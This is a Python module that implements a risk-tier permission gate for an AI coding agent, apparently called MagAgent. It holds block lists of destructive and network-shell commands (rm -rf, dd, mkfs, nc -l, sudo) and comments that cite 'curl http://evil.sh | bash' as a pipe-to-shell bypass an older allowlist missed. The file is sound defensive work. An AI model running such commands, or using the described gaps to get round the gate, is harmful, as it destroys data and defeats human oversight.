"""Risk-tier permission model for MagAgent.

Tiers:
  0 — Silent  : auto-execute, no notification
  1 — Auto    : execute + show in audit trail
  2 — Confirm : show proposed action, press Enter to confirm
  3 — Block   : typed confirmation required

Modes:
  silent   — tiers 0-2 auto; only tier 3 prompts
  balanced — tier 0-1 auto; tier 2 confirms; tier 3 blocks/prompts  (default)
  paranoid — tier 0 auto; all others prompt
  yolo     — everything auto (tier 3 shown but one-key confirm)
"""

from __future__ import annotations

import ast
import fnmatch
from collections.abc import Callable
from enum import IntEnum
from pathlib import Path
from typing import NamedTuple

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm, Prompt

from magent.permissions.shell_parse import Segment, parse_command

console = Console()


class RiskTier(IntEnum):
    SILENT = 0
    AUTO = 1
    CONFIRM = 2
    BLOCK = 3


TIER_LABELS = {
    RiskTier.SILENT: "[dim]silent[/dim]",
    RiskTier.AUTO: "[green]auto[/green]",
    RiskTier.CONFIRM: "[yellow]confirm[/yellow]",
    RiskTier.BLOCK: "[red]block[/red]",
}

# ─────────────────────────────────────────────
# Shell command classifier
# ─────────────────────────────────────────────

# Patterns that are always tier 0 (silent reads)
_SILENT_PATTERNS: list[str] = [
    "git status",
    "git log*",
    "git diff*",
    "git show*",
    "git branch*",
    "ls*",
    "cat *",
    "head *",
    "tail *",
    "wc *",
    "find *",
    "echo *",
    "pwd",
    "whoami",
    "which *",
    "type *",
    "sort *",
    "rg *",
    "grep *",
    "sed *",
    "awk *",
    "cut *",
    "tr *",
    "od *",
    "fd *",
    "bat *",
    "node --version",
    "node -v",
    "npm --version",
    "npm -v",
    "npx --version",
    "npx -v",
]

# Patterns that are tier 1 (auto with audit)
_AUTO_PATTERNS: list[str] = [
    "git add*",
    "git commit*",
    "git stash*",
    "git checkout*",
    "git switch*",
    "git restore*",
    "git reset --soft*",
    "git reset --mixed*",
    "npm install*",
    "npm run*",
    "npm test*",
    "npm ci*",
    "yarn *",
    "pnpm *",
    "pip install*",
    "pip uninstall*",
    "uv *",
    "cargo build*",
    "cargo test*",
    "cargo run*",
    "cargo check*",
    "cargo fmt*",
    "cargo clippy*",
    "pytest*",
    "python -m pytest*",
    "make *",
    "docker build*",
    "docker run*",
    "docker compose up*",
    "docker compose down*",
    "go build*",
    "go test*",
    "go run*",
]

# Patterns that are tier 2 (require confirm)
_CONFIRM_PATTERNS: list[str] = [
    "git push*",
    "git pull*",
    "git fetch*",
    "git merge*",
    "git rebase*",
    "git reset --hard*",
    "git clean*",
    "curl *",
    "wget *",
    "httpie *",
    "ssh *",
    "scp *",
    "docker push*",
    "docker pull*",
    "npm publish*",
    "pip install --upgrade*",
    "chmod *",
    "chown *",
]

# Anything matching these is always tier 3
_BLOCK_PATTERNS: list[str] = [
    "rm -rf*",
    "rm -r*",
    "rmdir*",
    "sudo *",
    "su *",
    "mkfs*",
    "fdisk*",
    "parted*",
    "dd if=*",
    "shred *",
    "> /etc/*",
    ">> /etc/*",
    "systemctl*",
    "service *",
    "iptables*",
    "ufw *",
    "passwd *",
    "useradd*",
    "userdel*",
    "crontab*",
    "kill -9*",
    "killall*",
    "nc -l*",
    "ncat*",
]

_READ_ONLY_COMMANDS = {
    "bat",
    "cat",
    "cd",
    "echo",
    "fd",
    "find",
    "grep",
    "head",
    "ls",
    "awk",
    "cut",
    "od",
    "pwd",
    "rg",
    "sed",
    "tail",
    "sort",
    "tr",
    "type",
    "wc",
    "which",
}
_NETWORK_FETCH_COMMANDS = {"curl", "wget"}

# Long flags that make a fetch write, upload or mutate.
_NETWORK_WRITE_LONG_FLAGS = {
    "--data",
    "--data-raw",
    "--data-ascii",
    "--data-binary",
    "--data-urlencode",
    "--json",
    "--form",
    "--form-string",
    "--upload-file",
    "--output",
    "--remote-name",
    "--remote-name-all",
    "--remote-header-name",
    "--output-dir",
    "--create-dirs",
    # wget's mutating/writing family, absent from the original set entirely.
    "--post-data",
    "--post-file",
    "--body-data",
    "--body-file",
    "--output-document",
    "--output-file",
    "--directory-prefix",
    "--input-file",
    "--warc-file",
}

# Long flags that are safe and take no value.
_NETWORK_SAFE_LONG_FLAGS = {
    "--silent",
    "--show-error",
    "--location",
    "--location-trusted",
    "--fail",
    "--fail-with-body",
    "--include",
    "--head",
    "--insecure",
    "--compressed",
    "--verbose",
    "--globoff",
    "--no-progress-meter",
    "--no-buffer",
    "--tlsv1.2",
    "--http1.1",
    "--http2",
    "--ipv4",
    "--ipv6",
    "--quiet",
    "--spider",
    "--no-verbose",
    "--server-response",
    "--content-on-error",
}

# Long flags that are safe but consume the following token as their value.
_NETWORK_SAFE_VALUE_LONG_FLAGS = {
    "--header",
    "--user-agent",
    "--referer",
    "--max-time",
    "--connect-timeout",
    "--retry",
    "--retry-delay",
    "--range",
    "--cookie",
    "--url",
    "--write-out",
    "--proto",
    "--resolve",
    "--timeout",
    "--tries",
    "--user",
    "--password",
}

# Short flag letters, by behaviour. Bundled clusters like ``-sO`` are expanded,
# which is what let ``curl -sO http://host/x.sh`` through as a read-only fetch.
_NETWORK_WRITE_SHORT = set("doOTFJ")
_NETWORK_SAFE_SHORT_NOVALUE = set("sSLkfiIvgq46#N")
_NETWORK_SAFE_SHORT_VALUE = set("HAemrtwPu")
_NETWORK_METHOD_SHORT = set("X")

# Commands whose ordinary flags turn a "read-only" tool into a writer.
_DESTRUCTIVE_FIND_ACTIONS = {
    "-delete",
    "-exec",
    "-execdir",
    "-ok",
    "-okdir",
    "-fprint",
    "-fprint0",
    "-fprintf",
    "-fls",
}
_DESTRUCTIVE_EXEC_HEADS = {"rm", "rmdir", "shred", "dd", "mkfs", "chmod", "chown", "mv"}

# A wildcard segment in a saved pattern must never be able to authorise one of
# these — that is what turned an approved ``curl … | head`` into a licence for
# ``curl http://evil.sh | bash``.
_INTERPRETER_HEADS = {
    "bash",
    "sh",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "csh",
    "tcsh",
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "node",
    "deno",
    "bun",
    "php",
    "eval",
    "source",
    "exec",
    "env",
    "xargs",
    "sudo",
    "su",
    "nohup",
    "setsid",
}

# Reasons an allowlist entry may lower to AUTO. Anything explicitly risky —
# a block pattern, a file-writing redirect, a network upload — stays put.
_LOWERABLE_REASONS = {
    "auto-pattern",
    "empty",
    "pip",
    "python-exec",
    "python-probe",
    "read-only",
    "silent-pattern",
    "unknown-command",
    "version-probe",
}


# The permission modes that are actually implemented. desktop_api advertised
# "ask", "strict" and "permissive", none of which exist — unknown modes fall
# through to balanced behaviour.
PERMISSION_MODES = frozenset({"silent", "balanced", "paranoid", "yolo"})


class ShellClassification(NamedTuple):
    """A tier plus the rule that produced it, for auditing and `permission classify`."""

    tier: RiskTier
    reason: str
    detail: str = ""


def _matches_any(cmd: str, patterns: list[str]) -> bool:
    cmd_lower = cmd.strip().lower()
    return any(fnmatch.fnmatch(cmd_lower, p.lower()) for p in patterns)


def _matched_pattern(cmd: str, patterns: list[str]) -> str:
    cmd_lower = cmd.strip().lower()
    for pattern in patterns:
        if fnmatch.fnmatch(cmd_lower, pattern.lower()):
            return pattern
    return ""


def classify_shell_command(
    cmd: str,
    allowlist: list[str] | None = None,
) -> RiskTier:
    """Return the risk tier for a shell command string."""
    return describe_shell_command(cmd, allowlist).tier


def describe_shell_command(
    cmd: str,
    allowlist: list[str] | None = None,
) -> ShellClassification:
    """Classify ``cmd`` and explain which rule decided the tier.

    Classification is structural: the command is parsed into segments, each
    segment is judged on its head command, flags and redirects, and commands
    nested inside substitutions are classified recursively. The tier is the
    maximum over everything found.
    """
    parsed = parse_command(cmd)

    # Fail closed: a command we could not parse is a command we cannot vouch for.
    if not parsed.ok:
        return ShellClassification(RiskTier.BLOCK, "parse-error", parsed.error)
    if not parsed.segments:
        return ShellClassification(RiskTier.CONFIRM, "empty", "")

    worst = max(
        (_classify_segment(segment) for segment in parsed.segments),
        key=lambda item: item.tier,
    )

    if allowlist and worst.reason in _LOWERABLE_REASONS:
        matched = next(
            (pattern for pattern in allowlist if shell_pattern_matches(pattern, cmd)),
            "",
        )
        if matched:
            return ShellClassification(RiskTier.AUTO, "allowlist", matched)

    return worst


def _classify_segment(segment: Segment) -> ShellClassification:
    """Judge a single simple command, including anything nested inside it."""
    results = [_classify_segment_body(segment)]

    # A substitution runs a command of its own; classify it and take the worst.
    for inner in segment.substitutions:
        nested = describe_shell_command(inner)
        results.append(ShellClassification(nested.tier, "substitution", inner.strip()))

    return max(results, key=lambda item: item.tier)


def _classify_segment_body(segment: Segment) -> ShellClassification:
    # A redirect that creates or truncates a real file is a write, whatever the
    # command in front of it happens to be.
    for redirect in segment.writes_files:
        return ShellClassification(RiskTier.BLOCK, "redirect-write", f"{redirect.operator} {redirect.target}")

    if not segment.argv:
        return ShellClassification(RiskTier.SILENT, "empty", "")

    normalized = segment.normalized()
    head = segment.head

    blocked = _matched_pattern(normalized, _BLOCK_PATTERNS)
    if blocked:
        return ShellClassification(RiskTier.BLOCK, "block-pattern", blocked)

    if head in _NETWORK_FETCH_COMMANDS:
        return _classify_network_fetch(segment)

    if _is_version_probe(segment.argv):
        return ShellClassification(RiskTier.SILENT, "version-probe", head)

    if head in {"python", "python3", "python2"}:
        args = segment.args
        if args[:2] == ["-m", "pip"]:
            writes = "install" in args or "uninstall" in args
            return ShellClassification(RiskTier.AUTO if writes else RiskTier.SILENT, "pip", head)
        if len(args) >= 2 and args[0] == "-c" and _is_python_safe_probe(args[1]):
            return ShellClassification(RiskTier.SILENT, "python-probe", "inert import/print")
        return ShellClassification(RiskTier.CONFIRM, "python-exec", head)

    destructive = _destructive_flag(segment)
    if destructive is not None:
        return destructive

    confirmed = _matched_pattern(normalized, _CONFIRM_PATTERNS)
    if confirmed:
        return ShellClassification(RiskTier.CONFIRM, "confirm-pattern", confirmed)

    if head in _READ_ONLY_COMMANDS:
        return ShellClassification(RiskTier.SILENT, "read-only", head)

    if head in {"pip", "pip3"}:
        writes = "install" in segment.args or "uninstall" in segment.args
        return ShellClassification(RiskTier.AUTO if writes else RiskTier.SILENT, "pip", head)

    auto = _matched_pattern(normalized, _AUTO_PATTERNS)
    if auto:
        return ShellClassification(RiskTier.AUTO, "auto-pattern", auto)

    silent = _matched_pattern(normalized, _SILENT_PATTERNS)
    if silent:
        return ShellClassification(RiskTier.SILENT, "silent-pattern", silent)

    return ShellClassification(RiskTier.CONFIRM, "unknown-command", head)


def _destructive_flag(segment: Segment) -> ShellClassification | None:
    """Flags that turn a nominally read-only tool into one that writes."""
    head = segment.head
    args = segment.args

    if head == "sed":
        for arg in args:
            if arg == "--in-place" or arg.startswith("--in-place="):
                return ShellClassification(RiskTier.CONFIRM, "destructive-flag", "sed --in-place")
            if arg.startswith("-") and not arg.startswith("--") and "i" in arg[1:]:
                return ShellClassification(RiskTier.CONFIRM, "destructive-flag", "sed -i")

    if head == "find":
        for index, arg in enumerate(args):
            if arg not in _DESTRUCTIVE_FIND_ACTIONS:
                continue
            following = args[index + 1] if index + 1 < len(args) else ""
            if Path(following).name.lower() in _DESTRUCTIVE_EXEC_HEADS:
                return ShellClassification(RiskTier.BLOCK, "destructive-flag", f"find {arg} {following}")
            return ShellClassification(RiskTier.CONFIRM, "destructive-flag", f"find {arg}")

    if head in {"sort", "awk", "gawk"}:
        for arg in args:
            if arg in {"-o", "--output"} or arg.startswith("--output="):
                return ShellClassification(RiskTier.CONFIRM, "destructive-flag", f"{head} --output")

    if head in {"tee", "truncate"}:
        return ShellClassification(RiskTier.CONFIRM, "destructive-flag", head)

    return None


def _classify_network_fetch(segment: Segment) -> ShellClassification:
    """Classify curl/wget by what their flags actually do."""
    head = segment.head
    args = segment.args
    index = 0

    # wget writes a file to disk unless explicitly told not to, so it is only
    # read-only when it is spidering or streaming to stdout.
    wget_read_only = False

    while index < len(args):
        arg = args[index]

        if not arg.startswith("-") or arg == "-":
            index += 1
            continue

        if arg.startswith("--"):
            name, _, inline = arg.partition("=")
            if name in {"--request", "--method"}:
                method = (inline or (args[index + 1] if index + 1 < len(args) else "")).upper()
                if method not in {"GET", "HEAD", ""}:
                    return ShellClassification(RiskTier.CONFIRM, "network-write", f"{name} {method}")
                index += 1 if inline else 2
                continue
            if name in _NETWORK_WRITE_LONG_FLAGS:
                value = inline or (args[index + 1] if index + 1 < len(args) else "")
                if name in {"--output-document", "--output"} and value == "-":
                    wget_read_only = True
                    index += 1 if inline else 2
                    continue
                return ShellClassification(RiskTier.CONFIRM, "network-write", name)
            if name == "--spider":
                wget_read_only = True
                index += 1
                continue
            if name in _NETWORK_SAFE_LONG_FLAGS:
                index += 1
                continue
            if name in _NETWORK_SAFE_VALUE_LONG_FLAGS:
                index += 1 if inline else 2
                continue
            # Unknown fetch flags are no longer assumed harmless.
            return ShellClassification(RiskTier.CONFIRM, "network-unknown-flag", name)

        # Short cluster: expand it letter by letter, original case preserved.
        cluster = arg[1:]
        position = 0
        while position < len(cluster):
            letter = cluster[position]
            if letter in _NETWORK_WRITE_SHORT:
                value = cluster[position + 1 :] or (args[index + 1] if index + 1 < len(args) else "")
                if letter in {"O", "o"} and head == "wget" and value == "-":
                    wget_read_only = True
                    break
                return ShellClassification(RiskTier.CONFIRM, "network-write", f"-{letter}")
            if letter in _NETWORK_METHOD_SHORT:
                method = (cluster[position + 1 :] or (args[index + 1] if index + 1 < len(args) else "")).upper()
                if method not in {"GET", "HEAD", ""}:
                    return ShellClassification(RiskTier.CONFIRM, "network-write", f"-{letter} {method}")
                break
            if letter in _NETWORK_SAFE_SHORT_VALUE:
                break  # the rest of the cluster (or the next token) is its value
            if letter in _NETWORK_SAFE_SHORT_NOVALUE:
                position += 1
                continue
            return ShellClassification(RiskTier.CONFIRM, "network-unknown-flag", f"-{letter}")
        index += 1

    if head == "wget" and not wget_read_only:
        return ShellClassification(RiskTier.CONFIRM, "network-write", "wget writes to disk")

    return ShellClassification(RiskTier.AUTO, "network-read", head)


def _is_version_probe(tokens: list[str]) -> bool:
    if len(tokens) != 2:
        return False
    head = Path(tokens[0]).name.lower()
    return head in {"node", "npm", "npx", "yarn", "pnpm", "bun"} and tokens[1] in {
        "--version",
        "-v",
    }


def _is_inert_expression(node: ast.AST) -> bool:
    """True when evaluating ``node`` cannot call anything."""
    for child in ast.walk(node):
        if isinstance(
            child,
            ast.Call
            | ast.Lambda
            | ast.Await
            | ast.NamedExpr
            | ast.Yield
            | ast.YieldFrom
            | ast.ListComp
            | ast.SetComp
            | ast.DictComp
            | ast.GeneratorExp,
        ):
            return False
    return True


def _is_python_safe_probe(code: str) -> bool:
    """Allowlist, not blocklist: only imports and inert ``print`` calls qualify.

    The old blocklist missed ``os.remove``, ``urllib``, ``socket``, ``ctypes``
    and more. Here anything that is not an import or a ``print`` of a
    call-free expression falls through to CONFIRM.
    """
    try:
        tree = ast.parse(code.strip())
    except (SyntaxError, ValueError):
        return False

    if not tree.body:
        return False

    for statement in tree.body:
        if isinstance(statement, ast.Import | ast.ImportFrom):
            continue
        if isinstance(statement, ast.Expr) and isinstance(statement.value, ast.Call):
            call = statement.value
            if not (isinstance(call.func, ast.Name) and call.func.id == "print"):
                return False
            if any(not _is_inert_expression(arg) for arg in call.args):
                return False
            if any(not _is_inert_expression(keyword.value) for keyword in call.keywords):
                return False
            continue
        return False

    return True


def shell_pattern_matches(pattern: str, command: str) -> bool:
    """Structural match of a trust/allowlist pattern against a command.

    ``fnmatch`` on the raw string let a single ``*`` span ``;``, ``|`` and
    newlines, so approving ``curl … | head`` once quietly approved
    ``curl http://evil.sh | bash`` forever. Matching segment by segment keeps a
    wildcard inside the segment it was written for.
    """
    if pattern.strip() == command.strip():
        return True

    parsed_command = parse_command(command)
    parsed_pattern = parse_command(pattern)
    if not (parsed_command.ok and parsed_pattern.ok):
        return False

    # Never let a stored pattern pre-approve a command substitution.
    if parsed_command.substitutions:
        return False

    if len(parsed_command.segments) != len(parsed_pattern.segments):
        return False

    for pattern_segment, command_segment in zip(
        parsed_pattern.segments, parsed_command.segments, strict=True
    ):
        # A file-writing redirect has to be spelled out in the pattern too.
        if command_segment.writes_files and not pattern_segment.writes_files:
            return False
        if pattern_segment.head in {"", "*"} and command_segment.head in _INTERPRETER_HEADS:
            return False
        if not fnmatch.fnmatch(
            command_segment.normalized().lower(), pattern_segment.normalized().lower()
        ):
            return False

    return True


# ─────────────────────────────────────────────
# File operation tiers
# ─────────────────────────────────────────────


def classify_file_op(op: str, path: str, cwd: str) -> RiskTier:
    """Classify a file operation by type and path."""
    root = Path(cwd).resolve()
    raw_path = Path(path).expanduser()
    abs_path = (raw_path if raw_path.is_absolute() else root / raw_path).resolve(strict=False)
    try:
        # commonpath raises when the paths are on different drives/roots; the
        # containment answer itself comes from the parent check.
        in_cwd = abs_path == root or root in abs_path.parents
    except ValueError:
        in_cwd = False

    if op == "read":
        return RiskTier.SILENT if in_cwd else RiskTier.CONFIRM
    if op in ("write", "edit", "create"):
        return RiskTier.AUTO if in_cwd else RiskTier.CONFIRM
    if op == "delete":
        return RiskTier.CONFIRM if in_cwd else RiskTier.BLOCK
    return RiskTier.CONFIRM


# ─────────────────────────────────────────────
# Permission gate
# ─────────────────────────────────────────────


class PermissionResult(NamedTuple):
    approved: bool
    tier: RiskTier
    reason: str


def check_permission(
    action_description: str,
    tier: RiskTier,
    mode: str = "balanced",
    interactive: bool = True,
    ask: Callable[[str, RiskTier], bool] | None = None,
) -> PermissionResult:
    """
    Evaluate whether an action should proceed based on its tier and the active mode.

    Returns PermissionResult(approved, tier, reason).

    `ask` is an alternative to the terminal prompt, for a front end that has a
    user but not a console. Without it a non-interactive caller can only refuse:
    the local Web UI ran with `interactive=False`, so every tool above the
    auto-approve threshold was denied and the agent could not do real work.
    Passing `ask` makes that caller interactive through its own surface.
    """
    if ask is not None:
        interactive = True
    # Determine effective approval threshold by mode.
    auto_threshold = {
        "silent": RiskTier.BLOCK,  # 0-2 auto, only 3 prompts
        "balanced": RiskTier.CONFIRM,  # 0-1 auto, 2 confirms, 3 blocks
        "paranoid": RiskTier.AUTO,  # 0 auto, 1+ prompts
        "yolo": RiskTier.BLOCK + 1,  # everything auto
    }.get(mode, RiskTier.CONFIRM)

    # YOLO: always approve
    if mode == "yolo":
        if tier == RiskTier.BLOCK and interactive:
            # Still show the action but use a one-key confirm
            console.print(
                Panel(
                    f"[bold red]⚠ HIGH RISK ACTION[/bold red]\n{action_description}",
                    border_style="red",
                )
            )
            if ask is not None:
                return PermissionResult(bool(ask(action_description, tier)), tier, "yolo-prompt")
            ans = Prompt.ask("[red]YOLO mode — proceed?[/red] [y/N]", default="y")
            return PermissionResult(ans.lower() in ("y", "yes"), tier, "yolo-prompt")
        return PermissionResult(True, tier, "yolo-auto")

    # Auto-approve below threshold
    if tier < auto_threshold:
        return PermissionResult(True, tier, "auto")

    if not interactive:
        return PermissionResult(False, tier, "permission-required")

    if ask is not None:
        # One decision path for every non-terminal front end: it is shown the
        # same description and tier the console prompt would have shown.
        return PermissionResult(bool(ask(action_description, tier)), tier, "asked")

    # CONFIRM tier — show action, press Enter
    if tier == RiskTier.CONFIRM:
        console.print(
            Panel(
                f"[bold yellow]⚡ Action requires confirmation[/bold yellow]\n\n"
                f"[white]{action_description}[/white]",
                border_style="yellow",
                title="[yellow]Permission[/yellow]",
            )
        )
        approved = Confirm.ask("[yellow]Proceed?[/yellow]", default=True)
        return PermissionResult(approved, tier, "user-confirmed" if approved else "user-denied")

    # BLOCK tier — require typed confirmation
    if tier == RiskTier.BLOCK:
        console.print(
            Panel(
                f"[bold red]🛑 HIGH RISK ACTION — requires explicit confirmation[/bold red]\n\n"
                f"[white]{action_description}[/white]",
                border_style="red",
                title="[red]⚠ Permission Required[/red]",
            )
        )
        ans = Prompt.ask(
            '[red]Type "yes" to confirm, anything else to cancel[/red]',
            default="no",
        )
        approved = ans.strip().lower() == "yes"
        return PermissionResult(approved, tier, "user-confirmed" if approved else "user-denied")

    return PermissionResult(True, tier, "auto")
